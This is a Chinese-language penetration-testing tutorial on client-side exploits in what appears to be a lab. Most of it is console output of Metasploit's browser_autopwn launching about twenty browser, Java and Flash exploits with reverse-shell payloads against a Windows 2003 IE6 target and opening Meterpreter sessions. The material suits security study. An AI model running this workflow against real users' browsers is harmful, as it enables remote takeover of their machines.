# 客户端渗透攻击

客户端渗透攻击(Client-side Exploit)指的是攻击者构造畸形数据包发送给目标主机，用户在使用含有漏洞缺陷的客户端应用程序处理这些数据时，发生程序内部处理流程的错误，执行了内嵌于数据中的恶意代码，从而导致被入侵，经典漏洞有`MS11-050`IE漏洞和`MS10-087`Office漏洞

# 自动化浏览器攻击

Metasploit中提供了一个辅助模块`server/browser_autopwn`，用于自动化完成浏览器渗透测试

在设定好参数后

```
msf6 auxiliary(server/browser_autopwn) > run
[*] Auxiliary module running as background job 0.

[*] Setup

[*] Starting exploit modules on host 10.10.10.128...
[*] ---

msf6 auxiliary(server/browser_autopwn) > 
msf6 auxiliary(server/browser_autopwn) > 
[*] Starting exploit android/browser/webview_addjavascriptinterface with payload android/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/BgxZJhlEXkHPy
[*] Local IP: http://10.10.10.128:8080/BgxZJhlEXkHPy
[*] Server started.
[*] Starting exploit multi/browser/firefox_proto_crmfrequest with payload generic/shell_reverse_tcp
[*] Using URL: http://0.0.0.0:8080/DeMQcjZU
[*] Local IP: http://10.10.10.128:8080/DeMQcjZU
[*] Server started.
[*] Starting exploit multi/browser/firefox_tostring_console_injection with payload generic/shell_reverse_tcp
[*] Using URL: http://0.0.0.0:8080/pfRUwUqp
[*] Local IP: http://10.10.10.128:8080/pfRUwUqp
[*] Server started.
[*] Starting exploit multi/browser/firefox_webidl_injection with payload generic/shell_reverse_tcp
[*] Using URL: http://0.0.0.0:8080/doFMcYYk
[*] Local IP: http://10.10.10.128:8080/doFMcYYk
[*] Server started.
[*] Starting exploit multi/browser/java_atomicreferencearray with payload java/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/GJkn
[*] Local IP: http://10.10.10.128:8080/GJkn
[*] Server started.
[*] Starting exploit multi/browser/java_jre17_jmxbean with payload java/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/MetnSVy
[*] Local IP: http://10.10.10.128:8080/MetnSVy
[*] Server started.
[*] Starting exploit multi/browser/java_jre17_provider_skeleton with payload java/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/fFPq
[*] Local IP: http://10.10.10.128:8080/fFPq
[*] Server started.
[*] Starting exploit multi/browser/java_jre17_reflection_types with payload java/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/uAHircxoONiKB
[*] Local IP: http://10.10.10.128:8080/uAHircxoONiKB
[*] Server started.
[*] Starting exploit multi/browser/java_rhino with payload java/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/kmvp
[*] Local IP: http://10.10.10.128:8080/kmvp
[*] Server started.
[*] Starting exploit multi/browser/java_verifier_field_access with payload java/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/AXCUx
[*] Local IP: http://10.10.10.128:8080/AXCUx
[*] Server started.
[*] Starting exploit multi/browser/opera_configoverwrite with payload generic/shell_reverse_tcp
[*] Using URL: http://0.0.0.0:8080/gwjakQDlailTM
[*] Local IP: http://10.10.10.128:8080/gwjakQDlailTM
[*] Server started.
[*] Starting exploit windows/browser/adobe_flash_mp4_cprt with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/WMDMhPlJbnuo
[*] Local IP: http://10.10.10.128:8080/WMDMhPlJbnuo
[*] Server started.
[*] Starting exploit windows/browser/adobe_flash_rtmp with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/pWGximWV
[*] Local IP: http://10.10.10.128:8080/pWGximWV
[*] Server started.
[*] Starting exploit windows/browser/ie_cgenericelement_uaf with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/WLAa
[*] Local IP: http://10.10.10.128:8080/WLAa
[*] Server started.
[*] Starting exploit windows/browser/ie_createobject with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/xPaR
[*] Local IP: http://10.10.10.128:8080/xPaR
[*] Server started.
[*] Starting exploit windows/browser/ie_execcommand_uaf with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/LuKKroidZwjh
[*] Local IP: http://10.10.10.128:8080/LuKKroidZwjh
[*] Server started.
[*] Starting exploit windows/browser/mozilla_nstreerange with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/oQMeeXm
[*] Local IP: http://10.10.10.128:8080/oQMeeXm
[*] Server started.
[*] Starting exploit windows/browser/ms13_080_cdisplaypointer with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/nYyboPcrDk
[*] Local IP: http://10.10.10.128:8080/nYyboPcrDk
[*] Server started.
[*] Starting exploit windows/browser/ms13_090_cardspacesigninhelper with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/sXcyrs
[*] Local IP: http://10.10.10.128:8080/sXcyrs
[*] Server started.
[*] Starting exploit windows/browser/msxml_get_definition_code_exec with payload windows/meterpreter/reverse_tcp
[*] Using URL: http://0.0.0.0:8080/xraV
[*] Local IP: http://10.10.10.128:8080/xraV
[*] Server started.
[*] Starting handler for windows/meterpreter/reverse_tcp on port 3333
[*] Starting handler for generic/shell_reverse_tcp on port 6666
[*] Started reverse TCP handler on 10.10.10.128:3333 
[*] Starting handler for java/meterpreter/reverse_tcp on port 7777
[*] Started reverse TCP handler on 10.10.10.128:6666 
[*] Started reverse TCP handler on 10.10.10.128:7777 

[*] --- Done, found 20 exploit modules

[*] Using URL: http://0.0.0.0:8080/auto
[*] Local IP: http://10.10.10.128:8080/auto
[*] Server started.
[*] Handling '/auto'
[*] Handling '/auto?ns=1'
[*] Browser has javascript disabled, trying exploits that don't need it
[*] Recording detection from User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)
[*] Responding with 1 non-javascript exploits
[*] 10.10.10.130     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
[*] 10.10.10.130     java_atomicreferencearray - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB
[*] 10.10.10.130     java_jre17_provider_skeleton - handling request for /fFPq
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy/
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB/
[*] 10.10.10.130     java_rhino - Java Applet Rhino Script Engine Remote Code Execution handling request
[*] 10.10.10.130     java_verifier_field_access - Sending Java Applet Field Bytecode Verifier Cache Remote Code Execution
[*] 10.10.10.130     java_verifier_field_access - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     java_jre17_provider_skeleton - handling request for /fFPq/
[*] Handling '/auto'
[*] Handling '/auto?sessid=V2luZG93cyAyMDAzOnVuZGVmaW5lZDp1bmRlZmluZWQ6dW5kZWZpbmVkOlNQMDplbi11czp4ODY6TVNJRTo2LjA6'
[*] JavaScript Report: Windows 2003:undefined:undefined:undefined:SP0:en-us:x86:MSIE:6.0:
[*] Responding with 13 exploits
[*] 10.10.10.130     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
[*] 10.10.10.130     java_atomicreferencearray - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
[*] 10.10.10.130     java_atomicreferencearray - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy/
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy
[*] 10.10.10.130     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
[*] 10.10.10.130     java_atomicreferencearray - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy/
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB/
[*] 10.10.10.130     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
[*] 10.10.10.130     java_atomicreferencearray - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy/
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB/
[*] 10.10.10.130     java_rhino - Java Applet Rhino Script Engine Remote Code Execution handling request
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy
[*] 10.10.10.130     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
[*] 10.10.10.130     java_atomicreferencearray - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy/
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB/
[*] 10.10.10.130     java_rhino - Java Applet Rhino Script Engine Remote Code Execution handling request
[*] 10.10.10.130     java_verifier_field_access - Sending Java Applet Field Bytecode Verifier Cache Remote Code Execution
[*] 10.10.10.130     java_verifier_field_access - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB
[*] 10.10.10.130     ie_createobject - Sending exploit HTML...
[*] 10.10.10.130     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
[*] 10.10.10.130     java_atomicreferencearray - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy/
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB/
[*] 10.10.10.130     java_verifier_field_access - Sending Java Applet Field Bytecode Verifier Cache Remote Code Execution
[*] 10.10.10.130     java_verifier_field_access - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     java_rhino - Java Applet Rhino Script Engine Remote Code Execution handling request
[*] 10.10.10.130     ie_createobject - Sending EXE payload
[*] Sending stage (175174 bytes) to 10.10.10.130
[-] Meterpreter session 1 is not valid and will be closed
[*]  - Meterpreter session 1 closed.
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB
[*] 10.10.10.130     java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation Vulnerability
[*] 10.10.10.130     java_atomicreferencearray - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     ie_createobject - Sending exploit HTML...
[*] 10.10.10.130     java_jre17_jmxbean - handling request for /MetnSVy/
[*] 10.10.10.130     java_jre17_provider_skeleton - handling request for /fFPq
[*] 10.10.10.130     java_jre17_reflection_types - handling request for /uAHircxoONiKB/
[*] 10.10.10.130     java_rhino - Java Applet Rhino Script Engine Remote Code Execution handling request
[*] Meterpreter session 1 opened (10.10.10.128:3333 -> 127.0.0.1) at 2021-05-16 15:51:48 +0800
[*] 10.10.10.130     java_verifier_field_access - Sending Java Applet Field Bytecode Verifier Cache Remote Code Execution
[*] 10.10.10.130     java_verifier_field_access - Generated jar to drop (5263 bytes).
[*] 10.10.10.130     java_jre17_provider_skeleton - handling request for /fFPq/
[*] Sending stage (175174 bytes) to 10.10.10.130
[-] Meterpreter session 2 is not valid and will be closed
[*]  - Meterpreter session 2 closed.
[*] Meterpreter session 2 opened (10.10.10.128:3333 -> 127.0.0.1) at 2021-05-16 15:51:48 +0800

```

在靶机访问后，获得meterpreter shell

```
[*]  - Meterpreter session 2 closed.
[*] Meterpreter session 2 opened (10.10.10.128:3333 -> 127.0.0.1) at 2021-05-16 15:51:48 +0800
```

在这里遇到了一个问题，就是会出现浏览器防护的问题，需要手动将靶机中的安全设置关闭